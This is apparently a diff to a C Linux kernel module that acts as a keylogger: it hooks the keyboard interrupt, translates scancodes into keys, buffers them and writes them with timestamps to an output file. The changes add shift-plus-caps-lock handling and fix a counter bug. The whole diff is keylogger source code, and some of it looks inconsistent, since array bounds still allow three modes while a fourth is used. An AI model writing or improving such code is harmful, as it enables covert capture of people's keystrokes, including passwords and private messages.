@@ -28,7 +28,7 @@ int capsLockEnabled = 0;
 #define SHIFT_MODE 1
 #define CAPS_LOCK_MODE 2
 #define SHIFT_CAPS_LOCK_MODE 3
-#define NUMBER_OF_MODES 3 // TODO: change to 4 when shift+caps_lock implemented
+#define NUMBER_OF_MODES 3
 unsigned char previousScancode = 0;
 
 // output file constants/variables
@@ -58,6 +58,7 @@ int writeToFile(struct file *file, unsigned long long offset, unsigned char *dat
 void closeFile(struct file *file);
 static irqreturn_t get_scancode(int irq, void *id);
 void scancode_to_key(char scancode);
+int get_mode_index(char scancode);
 void check_shift_and_caps(unsigned char scancode);
 void write_buffer_to_output(void);
 void generate_timestamp(void);
@@ -70,7 +71,7 @@ int get_timestamp_index(char c);
 /* For the 2nd index: 	index = 0, no special keys enabled
 			index = 1, only shift enabled
 			index = 2, only caps lock enabled
-			index = 3, both caps lock and shift enabled (TODO: still needs to be implemented)
+			index = 3, both caps lock and shift enabled
 */
 char *scancodes[][NUMBER_OF_MODES] = {
 	{"/0", "/0", "/0"},		{"/e", "/e", "/e"},	 	{"1", "!", "1"}, 
@@ -106,7 +107,7 @@ char *scancodes[][NUMBER_OF_MODES] = {
 	{"Keypad-2", "Down", "Keypad-2"}, 				{"Keypad-3", "PgDn", "Keypad-3"},
 	{"Keypad-0", "Ins", "Keypad-0"}, 				{"Keypad-.", "Del", "Keypad-."}, 
 	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 			{"\0", "\0", "\0"}, 
-	{"\0", "\0", "\0"}, 		{"F11", "F11", "F11"}, 		{"F12", "F12", "F12"} };                                  
+{"\0", "\0", "\0"}, {"F11", "F11", "F11"}, {"F12", "F12", "F12"} };                               
 
 // Create the output file
 struct file *createFile(const char *path) 
@@ -171,13 +172,13 @@ void scancode_to_key(char scancode)
 		}
 
 		//TODO: implement
-/*
 		else if (capsLockEnabled == 1 && shiftPressed == 1) // both caps lock and shift enabled
 		{
-			printk("%s\n", scancodes[scancode][SHIFT_CAPS_LOCK_MODE]);
-			char_buffer[pos] = scancodes[scancode][SHIFT_CAPS_LOCK_MODE];
+			int mode = get_mode_index(scancode);
+			printk("%s\n", scancodes[scancode][mode]);
+			char_buffer[pos] = scancodes[scancode][mode];
 		}
-*/
+
 
 		else if (capsLockEnabled == 0 && shiftPressed == 1) // only shift enabled
 		{
@@ -201,6 +202,31 @@ void scancode_to_key(char scancode)
 
 		mutex_unlock(&buffer_mutex);
 	}
+}
+
+// gets the mode index for the scancodes array when both shift and caps lock are enabled
+int get_mode_index(char scancode)
+{
+	int index;
+	int q_hex = 0x10; // q to p on keyboard
+	int p_hex = 0x19;
+	int a_hex = 0x1e; // a to l on keyboard
+	int l_hex = 0x26;
+	int z_hex = 0x2c; // z to m on keyboard
+	int m_hex = 0x32;
+	
+	if (	(scancode >= q_hex && scancode <= p_hex) ||
+		(scancode >= a_hex && scancode <= l_hex) ||
+		(scancode >= z_hex && scancode <= m_hex))
+	{
+		index = NORMAL_MODE;
+	}
+	else
+	{
+		index = SHIFT_MODE;
+	}
+
+	return index;
 }
 
 // checks if shift or caps lock were pressed
@@ -253,7 +279,7 @@ void write_buffer_to_output(void)
 	{
 		writeToFile(outfile, 0, char_buffer[i], 1);
 		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
-		  count =+ 1;
+		  count++;
 		}
 		i++;
 	}
@@ -275,7 +301,7 @@ void generate_timestamp(void)
 
 	sec = total_sec % 60;
 	min = (total_sec / 60) % 60;
-	hr = (((total_sec / 3600) % 24) - 5);
+	hr = (((total_sec / 3600) % 24) - 5); // -5 for EST time zone
 
 	// build timestamp string
 	sprintf(timestamp, "[%02d:%02d:%02d]", hr, min, sec);
